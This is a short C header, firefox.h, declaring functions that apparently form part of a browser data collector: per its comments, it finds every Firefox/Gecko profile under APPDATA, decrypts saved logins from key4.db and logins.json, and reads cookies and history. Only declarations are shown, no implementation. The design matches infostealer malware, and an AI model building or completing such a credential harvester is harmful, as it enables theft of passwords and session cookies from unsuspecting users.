#ifndef FIREFOX_H
#define FIREFOX_H

#include "chromium.h"  /* reuse BrowserData and CollectResult types */

/*
 * Collect data from all Firefox/Gecko browsers in APPDATA.
 * For each browser: finds profile directories, reads key4.db + logins.json,
 * decrypts login credentials, reads cookies.sqlite and places.sqlite.
 */
CollectResult collect_firefox(const char *roaming_app_data);

/*
 * Free all memory allocated by collect_firefox.
 */
void free_firefox_data(CollectResult *result);

#endif
